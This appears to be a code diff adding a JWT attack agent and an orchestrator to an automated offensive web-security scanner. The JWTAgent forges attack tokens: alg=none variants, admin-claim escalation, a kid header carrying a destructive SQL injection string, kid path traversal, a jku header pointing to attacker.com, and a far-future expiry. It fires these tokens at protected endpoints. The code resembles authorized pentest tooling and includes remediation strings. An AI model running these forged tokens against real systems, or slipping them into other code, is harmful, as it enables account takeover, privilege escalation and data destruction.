+                            target         = h.target_node,
+                            vuln_type      = h.attack_vector,
+                            severity       = "high",
+                            title          = f"CORS Origin Reflected — '{origin}'",
+                            description    = "Server reflects arbitrary origin without credential flag (still risks data exfil).",
+                            payload        = origin,
+                            evidence       = f"ACAO: {acao} | ACAC: {acac}",
+                            cvss           = 6.5,
+                            confidence     = 0.80,
+                            reproduced     = True,
+                            chain_potential= ["cors_reflect_to_data_exfil"],
+                            remediation    = "Use an explicit origin allowlist rather than reflective CORS.",
+                        ))
+
+            except Exception as exc:
+                logger.debug("[%s] CORS test error: %s", self.name, exc)
+            await asyncio.sleep(0.05)
+
+        return findings
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+
+class JWTAgent(SwarmAgent):
+    """JWT vulnerability specialist — algorithm confusion, injection, claim manipulation."""
+
+    RELEVANT_NODE_TYPES      = ["url", "api_endpoint", "auth_flow"]
+    RELEVANT_LABEL_KEYWORDS  = ["jwt", "token", "bearer", "authorization"]
+
+    _JWT_NONE_VARIANTS = ["none", "None", "NONE", "nOnE"]
+
+    def __init__(self, **kwargs):
+        super().__init__(AgentType.JWT, **kwargs)
+
+    @staticmethod
+    def _b64_decode_pad(s: str) -> bytes:
+        """Base64url-decode with padding."""
+        import base64
+        s = s.replace("-", "+").replace("_", "/")
+        pad = 4 - len(s) % 4
+        if pad != 4:
+            s += "=" * pad
+        return base64.b64decode(s)
+
+    @staticmethod
+    def _b64url_encode(data: bytes) -> str:
+        import base64
+        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+    def _forge_none_token(self, token: str, alg_variant: str = "none") -> Optional[str]:
+        """Strip signature and set alg to a none-variant."""
+        import json as _json
+        try:
+            parts = token.split(".")
+            if len(parts) != 3:
+                return None
+            header = _json.loads(self._b64_decode_pad(parts[0]))
+            header["alg"] = alg_variant
+            new_header = self._b64url_encode(_json.dumps(header, separators=(",", ":")).encode())
+            return f"{new_header}.{parts[1]}."
+        except Exception:
+            return None
+
+    def _forge_claim_token(self, token: str, claim_changes: dict) -> Optional[str]:
+        """Modify payload claims; strip signature (requires secret for real HS256)."""
+        import json as _json
+        try:
+            parts = token.split(".")
+            if len(parts) != 3:
+                return None
+            payload = _json.loads(self._b64_decode_pad(parts[1]))
+            payload.update(claim_changes)
+            new_payload = self._b64url_encode(_json.dumps(payload, separators=(",", ":")).encode())
+            # Return with stripped sig — server accepting this = none_alg also broken
+            return f"{parts[0]}.{new_payload}."
+        except Exception:
+            return None
+
+    def _forge_kid_token(self, token: str, kid_value: str) -> Optional[str]:
+        """Inject kid header value."""
+        import json as _json
+        try:
+            parts = token.split(".")
+            if len(parts) != 3:
+                return None
+            header = _json.loads(self._b64_decode_pad(parts[0]))
+            header["kid"] = kid_value
+            new_header = self._b64url_encode(_json.dumps(header, separators=(",", ":")).encode())
+            return f"{new_header}.{parts[1]}."
+        except Exception:
+            return None
+
+    async def generate_hypotheses(self, target, graph_nodes, context) -> List[Hypothesis]:
+        import json as _json
+        hypotheses: List[Hypothesis] = []
+        jwt_tokens = context.get("jwt_tokens", [])
+
+        for token in jwt_tokens[:5]:
+            # Parse header/payload for context
+            try:
+                parts = token.split(".")
+                header  = _json.loads(self._b64_decode_pad(parts[0])) if len(parts) == 3 else {}
+                payload = _json.loads(self._b64_decode_pad(parts[1])) if len(parts) == 3 else {}
+            except Exception:
+                header, payload = {}, {}
+
+            # none algorithm variants (high priority)
+            for alg_var in self._JWT_NONE_VARIANTS:
+                forged = self._forge_none_token(token, alg_var)
+                if forged:
+                    hypotheses.append(Hypothesis(
+                        hypothesis_id = uuid.uuid4().hex[:8],
+                        agent_type    = self.agent_type,
+                        target_node   = target,
+                        attack_vector = "jwt_none_alg",
+                        confidence    = self.memory.rate("jwt_none_alg", 0.80),
+                        payload       = forged,
+                        context       = {"original_token": token, "alg_variant": alg_var,
+                                         "header": header, "payload_claims": payload},
+                        reasoning     = f"JWT none-algorithm ({alg_var}): strip signature to bypass verification",
+                        priority      = 0.80,
+                    ))
+
+            # Claim escalation (high priority)
+            escalation_claims = {"role": "admin", "is_admin": True, "sub": "1",
+                                 "admin": True, "scope": "admin"}
+            forged_claims = self._forge_claim_token(token, escalation_claims)
+            if forged_claims:
+                hypotheses.append(Hypothesis(
+                    hypothesis_id = uuid.uuid4().hex[:8],
+                    agent_type    = self.agent_type,
+                    target_node   = target,
+                    attack_vector = "jwt_claim_escalation",
+                    confidence    = self.memory.rate("jwt_claim_escalation", 0.75),
+                    payload       = forged_claims,
+                    context       = {"original_token": token, "claim_changes": escalation_claims,
+                                     "original_claims": payload},
+                    reasoning     = "JWT claim manipulation: elevate role/admin claims",
+                    priority      = 0.75,
+                ))
+
+            # RS256 → HS256 algorithm confusion
+            if header.get("alg", "") == "RS256":
+                hypotheses.append(Hypothesis(
+                    hypothesis_id = uuid.uuid4().hex[:8],
+                    agent_type    = self.agent_type,
+                    target_node   = target,
+                    attack_vector = "jwt_rs256_hs256",
+                    confidence    = self.memory.rate("jwt_rs256_hs256", 0.60),
+                    payload       = token,
+                    context       = {"original_token": token, "original_alg": "RS256"},
+                    reasoning     = "Algorithm confusion: switch RS256→HS256 and sign with public key",
+                    priority      = 0.60,
+                ))
+
+            # kid SQLi injection
+            kid_sqli = self._forge_kid_token(token, "'; DROP TABLE users;--")
+            if kid_sqli:
+                hypotheses.append(Hypothesis(
+                    hypothesis_id = uuid.uuid4().hex[:8],
+                    agent_type    = self.agent_type,
+                    target_node   = target,
+                    attack_vector = "jwt_kid_sqli",
+                    confidence    = self.memory.rate("jwt_kid_sqli", 0.42),
+                    payload       = kid_sqli,
+                    context       = {"original_token": token, "kid": "'; DROP TABLE users;--"},
+                    reasoning     = "SQL injection via JWT kid header field",
+                    priority      = 0.42,
+                ))
+
+            # kid path traversal
+            kid_path = self._forge_kid_token(token, "../../dev/null")
+            if kid_path:
+                hypotheses.append(Hypothesis(
+                    hypothesis_id = uuid.uuid4().hex[:8],
+                    agent_type    = self.agent_type,
+                    target_node   = target,
+                    attack_vector = "jwt_kid_path",
+                    confidence    = self.memory.rate("jwt_kid_path", 0.45),
+                    payload       = kid_path,
+                    context       = {"original_token": token, "kid": "../../dev/null"},
+                    reasoning     = "Path traversal via JWT kid header — sign with empty key",
+                    priority      = 0.45,
+                ))
+
+            # jku injection
+            import json as _json2
+            try:
+                parts2 = token.split(".")
+                header2 = _json2.loads(self._b64_decode_pad(parts2[0])) if len(parts2) == 3 else {}
+                header2["jku"] = "https://attacker.com/.well-known/jwks.json"
+                jku_header = self._b64url_encode(_json2.dumps(header2, separators=(",", ":")).encode())
+                jku_token = f"{jku_header}.{parts2[1]}." if len(parts2) == 3 else None
+            except Exception:
+                jku_token = None
+            if jku_token:
+                hypotheses.append(Hypothesis(
+                    hypothesis_id = uuid.uuid4().hex[:8],
+                    agent_type    = self.agent_type,
+                    target_node   = target,
+                    attack_vector = "jwt_jku_inject",
+                    confidence    = self.memory.rate("jwt_jku_inject", 0.50),
+                    payload       = jku_token,
+                    context       = {"original_token": token,
+                                     "jku": "https://attacker.com/.well-known/jwks.json"},
+                    reasoning     = "Inject attacker JWKS URL via jku header to force server to fetch our keys",
+                    priority      = 0.50,
+                ))
+
+            # Expiry bypass (set exp far future)
+            far_future_claims = {"exp": 253402300800}  # year 9999
+            forged_exp = self._forge_claim_token(token, far_future_claims)
+            if forged_exp:
+                hypotheses.append(Hypothesis(
+                    hypothesis_id = uuid.uuid4().hex[:8],
+                    agent_type    = self.agent_type,
+                    target_node   = target,
+                    attack_vector = "jwt_expiry_bypass",
+                    confidence    = self.memory.rate("jwt_expiry_bypass", 0.35),
+                    payload       = forged_exp,
+                    context       = {"original_token": token, "exp": 253402300800},
+                    reasoning     = "Set exp to year 9999 — server may not validate exp if signature check passes",
+                    priority      = 0.35,
+                ))
+
+        hypotheses.sort(key=lambda h: h.priority, reverse=True)
+        return hypotheses[:30]
+
+    async def execute_tests(self, target, hypotheses, context) -> List[AgentFinding]:
+        findings: List[AgentFinding] = []
+        protected_eps = context.get("protected_endpoints",
+                                    context.get("auth_endpoints", [target]))
+
+        for h in hypotheses:
+            if self._stop_event.is_set():
+                break
+            try:
+                for ep in protected_eps[:3]:
+                    result = await self._tool("jwt_tool",
+                        token=h.payload,
+                        attack=h.attack_vector,
+                        url=ep,
+                    )
+                    data = result.get("data") or {}
+                    # Also try a direct HTTP probe with the forged token
+                    http_result = await self._tool("http_request", url=ep, method="GET",
+                                                    headers={"Authorization": f"Bearer {h.payload}"})
+                    http_data   = http_result.get("data") or {}
+                    http_status = http_data.get("status", 0) if isinstance(http_data, dict) else 0
+                    http_body   = str(http_data.get("body", "") if isinstance(http_data, dict) else http_data)
+
+                    jwt_tool_vuln = (result.get("success") and
+                                     isinstance(data, dict) and data.get("vulnerable"))
+
+                    if h.attack_vector == "jwt_none_alg":
+                        if http_status == 200 or jwt_tool_vuln:
+                            findings.append(self._finding(
+                                target         = ep,
+                                vuln_type      = "jwt_none_alg",
+                                severity       = "critical",
+                                title          = f"JWT None Algorithm Accepted (variant: {h.context.get('alg_variant')})",
+                                description    = "Server accepts JWT with alg=none, allowing signature-less tokens.",
+                                payload        = h.payload[:300],
+                                evidence       = http_body[:400] or str(data)[:400],
+                                cvss           = 9.0,
+                                confidence     = 0.92,
+                                reproduced     = True,
+                                chain_potential= ["jwt_none_to_account_takeover"],
+                                remediation    = "Explicitly reject 'none' algorithm; use an algorithm allowlist.",
+                            ))
+                            break
+
+                    elif h.attack_vector == "jwt_claim_escalation":
+                        if http_status == 200 or jwt_tool_vuln:
+                            findings.append(self._finding(
+                                target         = ep,
+                                vuln_type      = "jwt_claim_escalation",
+                                severity       = "critical",
+                                title          = "JWT Claim Escalation — Forged Admin Token Accepted",
+                                description    = "Server accepted a JWT with manipulated role/admin claims.",
+                                payload        = h.payload[:300],
+                                evidence       = http_body[:400] or str(data)[:400],
+                                cvss           = 8.5,
+                                confidence     = 0.88,
+                                reproduced     = True,
+                                chain_potential= ["jwt_claim_to_full_admin"],
+                                remediation    = "Validate critical claims server-side; never trust JWT payload without signature verification.",
+                            ))
+                            break
+
+                    elif h.attack_vector in ("jwt_kid_sqli", "jwt_kid_path"):
+                        error_markers = ["sql", "syntax", "error", "exception",
+                                         "traceback", "invalid", "ORA-", "pg:"]
+                        if (http_status == 200 or jwt_tool_vuln or
+                                any(m.lower() in http_body.lower() for m in error_markers)):
+                            findings.append(self._finding(
+                                target         = ep,
+                                vuln_type      = h.attack_vector,
+                                severity       = "critical",
+                                title          = f"JWT kid Header Injection ({h.attack_vector})",
+                                description    = "JWT kid header processed unsafely — SQL injection or path traversal possible.",
+                                payload        = h.payload[:300],
+                                evidence       = http_body[:400] or str(data)[:400],
+                                cvss           = 9.0,
+                                confidence     = 0.82,
+                                reproduced     = True,
+                                chain_potential= ["jwt_kid_to_rce", "jwt_kid_to_sqli"],
+                                remediation    = "Validate and sanitize kid header; use a fixed key registry.",
+                            ))
+                            break
+
+                    elif h.attack_vector in ("jwt_rs256_hs256", "jwt_jku_inject", "jwt_expiry_bypass"):
+                        if http_status == 200 or jwt_tool_vuln:
+                            findings.append(self._finding(
+                                target         = ep,
+                                vuln_type      = h.attack_vector,
+                                severity       = "critical",
+                                title          = f"JWT Vulnerability: {h.attack_vector.replace('_', ' ').title()}",
+                                description    = f"JWT {h.attack_vector} attack succeeded against protected endpoint.",
+                                payload        = h.payload[:300],
+                                evidence       = http_body[:400] or str(data)[:400],
+                                cvss           = 9.0,
+                                confidence     = 0.85,
+                                reproduced     = True,
+                                chain_potential= ["jwt_attack_to_account_takeover"],
+                                remediation    = "Use RS256/ES256 with explicit algorithm allowlist; validate all claims.",
+                            ))
+                            break
+
+                await asyncio.sleep(0.05)
+            except Exception as exc:
+                logger.debug("[%s] JWT test error: %s", self.name, exc)
 
         return findings
 
@@ -2054,6 +3601,8 @@ _AGENT_CLASSES: Dict[AgentType, type] = {
     AgentType.SSRF:           SSRFAgent,
     AgentType.IDOR:           IDORAgent,
     AgentType.AUTH:           AuthAgent,
+    AgentType.CORS:           CORSAgent,
+    AgentType.JWT:            JWTAgent,
     AgentType.BUSINESS_LOGIC: BusinessLogicAgent,
     AgentType.MOBILE:         MobileSecurityAgent,
     AgentType.API:            APISecurityAgent,
@@ -2100,3 +3649,71 @@ def create_full_swarm(
         at: create_agent(at, tool_registry, attack_graph, knowledge_base, shared_state)
         for at in types
     }
+
+
+# ═════════════════════════════════════════════════════════════════════════════
+# SWARM INTELLIGENCE ENGINE
+# ═════════════════════════════════════════════════════════════════════════════
+
+class SwarmIntelligenceEngine:
+    """
+    Lightweight orchestrator that runs all swarm agents with a concurrency cap.
+
+    Uses an asyncio.Semaphore (default MAX_CONCURRENT_AGENTS=5) so that at most
+    N agents execute simultaneously, preventing resource exhaustion when 14+
+    agent types are registered.
+
+    Usage:
+        engine = SwarmIntelligenceEngine()
+        findings = asyncio.run(engine.run_all_agents("example.com", {}))
+    """
+
+    def __init__(
+        self,
+        tool_registry:  Optional[Any] = None,
+        attack_graph:   Optional[Any] = None,
+        knowledge_base: Optional[Any] = None,
+        shared_state:   Optional[Dict] = None,
+        agent_types:    Optional[List[AgentType]] = None,
+        max_concurrent: int = MAX_CONCURRENT_AGENTS,
+    ):
+        self.max_concurrent = max_concurrent
+        agents_dict = create_full_swarm(
+            tool_registry  = tool_registry,
+            attack_graph   = attack_graph,
+            knowledge_base = knowledge_base,
+            shared_state   = shared_state,
+            agent_types    = agent_types,
+        )
+        # Expose as a list for easy iteration and test inspection
+        self._agents: List[SwarmAgent] = list(agents_dict.values())
+
+    async def run_all_agents(
+        self, target: str, context: Dict[str, Any]
+    ) -> List[AgentFinding]:
+        """
+        Run every agent against *target* with at most *max_concurrent* running
+        at the same time.  Returns a flat list of all findings.
+        """
+        sem = asyncio.Semaphore(self.max_concurrent)
+
+        async def _run_with_cap(agent: SwarmAgent) -> List[AgentFinding]:
+            async with sem:
+                try:
+                    return await agent.run(target, context)
+                except Exception as exc:
+                    logger.warning("Swarm agent %s failed: %s", agent.name, exc)
+                    return []
+
+        results = await asyncio.gather(
+            *[_run_with_cap(a) for a in self._agents],
+            return_exceptions=True,
+        )
+
+        findings: List[AgentFinding] = []
+        for r in results:
+            if isinstance(r, Exception):
+                logger.warning("Swarm agent failed: %s", r)
+            elif r:
+                findings.extend(r if isinstance(r, list) else [r])
+        return findings
